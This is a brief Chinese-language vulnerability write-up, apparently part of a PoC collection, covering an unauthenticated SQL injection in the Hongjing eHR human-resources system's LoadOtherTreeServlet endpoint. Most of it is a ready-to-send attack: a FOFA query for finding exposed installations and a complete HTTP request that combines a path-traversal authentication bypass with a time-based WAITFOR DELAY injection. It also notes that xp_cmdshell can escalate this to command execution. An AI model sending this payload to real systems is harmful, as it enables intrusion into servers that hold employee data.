# 宏景eHR人力资源管理系统接口LoadOtherTreeServlet存在SQL注入漏洞

宏景eHR /gz/LoadOtherTreeServlet 接口处存在sql注入漏洞，未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

## fofa

```
app="HJSOFT-HCM"
```

## poc

```yaml
GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--&flag=1 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![image-20240704170848415](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407041708490.png)